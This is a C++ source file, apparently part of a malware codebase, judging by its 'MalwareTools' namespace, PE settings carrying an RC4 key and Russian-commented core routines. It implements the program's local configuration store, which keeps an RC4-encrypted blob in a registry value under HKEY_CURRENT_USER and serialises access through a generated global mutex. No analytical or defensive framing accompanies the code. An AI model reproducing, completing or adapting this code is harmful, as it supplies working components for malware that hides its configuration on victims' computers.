#include <windows.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "localconfig.h"

#include "..\common\registry.h"
#include "..\common\sync.h"
#include "..\common\process.h"

static WCHAR registryKey[CORE_REGISTRY_KEY_BUFFER_SIZE];
static WCHAR registryValue[CORE_REGISTRY_VALUE_BUFFER_SIZE];
static WCHAR readWriteMutex[50];
static HANDLE lastReadWriteMutex;

void LocalConfig::init(void)
{
  readWriteMutex[0] = 0;
  registryKey[0]    = 0;
}

void LocalConfig::uninit(void)
{

}

BinStorage::STORAGE *LocalConfig::getCurrent(void)
{
  void *data;
  DWORD dataSize;

  //Получем зашифрованные данные.
  {
    DWORD type;

    if(registryKey[0] == 0)Core::getRegistryValue(Core::RV_LOCALCONFIG, registryKey, registryValue);
    if((dataSize = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, registryKey, registryValue, &type, &data)) == (DWORD)-1)return NULL;
    if(type != REG_BINARY)
    {
      Mem::free(data);
      return NULL;
    }
  }

  //Получаем конфиг.
  {
    PESETTINGS pes;
    Core::getPeSettings(&pes);

    if(BinStorage::_unpack(NULL, data, dataSize, &pes.rc4Key) == 0)
    {
      Mem::free(data);
      return NULL;
    }
  }
  return (BinStorage::STORAGE *)data;
}

BinStorage::STORAGE *LocalConfig::beginReadWrite(void)
{
  if(readWriteMutex[0] == 0)Core::generateObjectName(Core::OBJECT_ID_LOCALCONFIG, readWriteMutex, MalwareTools::KON_GLOBAL);
  
  BinStorage::STORAGE *bs = NULL;
  HANDLE mutex = Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, readWriteMutex);
  if(mutex != NULL)
  {
    lastReadWriteMutex = mutex;
    if((bs = getCurrent()) == NULL && (bs = BinStorage::_createEmpty()) == NULL)
    {
      Sync::_freeMutex(mutex);
    }
  }
  return bs;
}

bool LocalConfig::endReadWrite(BinStorage::STORAGE *binStorage)
{
  bool r = false;
  if(binStorage != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)
  {
    //Шифруем.
    PESETTINGS pes;
    Core::getPeSettings(&pes);
      
    DWORD size = BinStorage::_pack(&binStorage, BinStorage::PACKF_FINAL_MODE, &pes.rc4Key);
    if(size > 0)r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, binStorage, size);
  }

  Mem::free(binStorage);
  Sync::_freeMutex(lastReadWriteMutex);
  return r;
}
